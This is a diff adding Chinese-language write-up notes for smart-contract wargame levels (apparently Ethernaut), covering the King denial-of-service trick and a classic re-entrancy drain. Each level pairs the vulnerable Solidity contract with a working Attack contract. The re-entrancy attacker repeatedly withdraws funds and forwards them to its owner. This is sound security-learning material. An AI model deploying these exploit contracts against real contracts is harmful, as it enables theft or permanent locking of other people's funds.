@@ -386,3 +386,138 @@ await web3.eth.getStorageAt(instance, 1).then(web3.utils.toAscii)
 // 补充： 通过 web3.utils.toAscii / web3.utils.toHex 可以转为可见字符或者/bytes
 await contract.unlock('0x412076657279207374726f6e67207365637265742070617373776f7264203a29')
 ```
+
+# King
+```solidity
+// SPDX-License-Identifier: MIT
+pragma solidity ^0.8.0;
+
+contract King {
+    address king;
+    uint256 public prize;
+    address public owner;
+
+    constructor() payable {
+        owner = msg.sender;
+        king = msg.sender;
+        prize = msg.value;
+    }
+
+    receive() external payable {
+        require(msg.value >= prize || msg.sender == owner);
+        payable(king).transfer(msg.value);
+        king = msg.sender;
+        prize = msg.value;
+    }
+
+    function _king() public view returns (address) {
+        return king;
+    }
+}
+```
+合约通过发送超过当前 prize 的以太坊成为“国王”（king），而被推翻的国王将获得 prize 的奖励。这是一种类似于庞氏骗局的游戏机制，游戏的设计鼓励参与者不断增加 prize 以争夺国王的位置。
+攻击目标是破坏这个合约，即在成为新的国王后，其他人也不能通过发送更高的 prize 夺取国王的位置。并且 submit 时也会尝试夺权，如果夺权失败则通关。
+- 合约中的潜在问题在于：当新的国王被推翻时，旧的国王会收到 prize。如果接收 prize 的操作失败，receive() 函数中的流程就会失败，国王位置将不会被更新。因此，可以利用一种方式阻止国王接收 prize，从而阻止其他人替代国王。部署一个智能合约，该合约的 receive() 函数拒绝接受以太坊，从而导致 King 合约在调用 payable(king).transfer() 时失败。
+
+```js
+// 查看当前 prize
+(await contract.prize()).toNumber()
+```
+
+```solidity
+// SPDX-License-Identifier: MIT
+pragma solidity ^0.8.0;
+
+contract Attack {
+    address payable kingContract;
+
+    constructor(address payable _kingContract) payable {
+        kingContract = _kingContract;
+    }
+
+    function attack() public payable {
+        // 向 King 合约发送超过当前 prize 的以太坊，成为国王
+        (bool success, ) = kingContract.call{value: msg.value}("");
+        require(success, "Attack failed");
+    }
+
+    // 通过阻止接收以太坊来破坏 King 合约
+    receive() external payable {
+        revert("Cannot become king");
+    }
+}
+```
+
+# Re-entrancy
+
+```solidity
+// SPDX-License-Identifier: MIT
+pragma solidity ^0.6.12;
+
+import "openzeppelin-contracts-06/math/SafeMath.sol";
+
+contract Reentrance {
+    using SafeMath for uint256;
+
+    mapping(address => uint256) public balances;
+
+    function donate(address _to) public payable {
+        balances[_to] = balances[_to].add(msg.value);
+    }
+
+    function balanceOf(address _who) public view returns (uint256 balance) {
+        return balances[_who];
+    }
+
+    function withdraw(uint256 _amount) public {
+        if (balances[msg.sender] >= _amount) {
+            (bool result,) = msg.sender.call{value: _amount}("");
+            if (result) {
+                _amount;
+            }
+            balances[msg.sender] -= _amount;
+        }
+    }
+
+    receive() external payable {}
+}
+```
+
+这道题是经典的重入漏洞；Reentrance 合约的 withdraw 函数在确保调用者有足够余额后，会将资金发送到调用者的地址。关键是在发送资金和更新余额之间，由于使用 call 方法，合约允许调用者的回退（fallback）方法执行，从而可能再次调用 withdraw 函数。如果回退方法中再次调用 withdraw，并且合约状态尚未更新，这将导致重入攻击。
+
+```solidity
+// SPDX-License-Identifier: MIT
+pragma solidity ^0.8.12;
+
+interface IReentrance {
+    function donate(address _to) external payable;
+    function withdraw(uint _amount) external;
+}
+
+contract Attack {
+    IReentrance public victimContract = IReentrance(0xFd0d5031eA1e5169a6C080a30069042a10CbC59b);
+    address public owner;
+
+    constructor() {
+        owner = msg.sender;
+    }
+
+    receive() external payable {
+        if (address(victimContract).balance >= 0.001 ether) {
+            victimContract.withdraw(0.001 ether);
+        } else {
+            victimContract.withdraw(address(victimContract).balance);
+        }
+    }
+
+    function attack() public payable {
+        victimContract.donate{value: 0.001 ether}(address(this));
+        victimContract.withdraw(0.001 ether);
+    }
+
+    function getFunds() public {
+       payable(owner).transfer(address(this).balance);
+    }
+}
+```
+attack 的时候传 0.001 ether 即可
